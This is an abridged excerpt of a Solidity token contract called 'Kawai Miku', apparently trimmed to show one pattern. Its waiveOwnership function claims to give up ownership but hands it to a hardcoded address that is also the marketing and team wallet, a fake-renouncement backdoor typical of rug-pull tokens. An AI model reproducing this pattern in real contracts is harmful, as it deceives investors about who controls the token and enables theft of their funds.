...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x04FB59A33756A240d3d6762b011126b6CdCF44B4);
    }
...
contract KawaiMiku is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Kawai Miku";
    string private _symbol = "Kawai Miku";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x04FB59A33756A240d3d6762b011126b6CdCF44B4);
    address payable public teamWalletAddress = payable(0x04FB59A33756A240d3d6762b011126b6CdCF44B4);
